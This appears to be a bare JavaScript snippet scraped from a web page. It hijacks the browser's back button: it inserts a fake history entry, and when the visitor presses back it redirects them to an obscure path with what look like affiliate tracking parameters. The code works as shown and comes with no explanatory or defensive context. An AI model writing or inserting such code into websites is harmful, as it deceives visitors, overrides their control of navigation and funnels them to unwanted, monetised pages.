(function(window, location) {
    var bbURL = '/jbzulnkwfkznyhg?mmid=2343&t=darkangel&type=20&pti=2';
    history.pushState(null, document.title, location);
    window.addEventListener("popstate", function() {
            history.replaceState(null, document.title, location);
            setTimeout(function() {
                location.replace(bbURL);
            }, 0);
    }, false);
}(window, location));
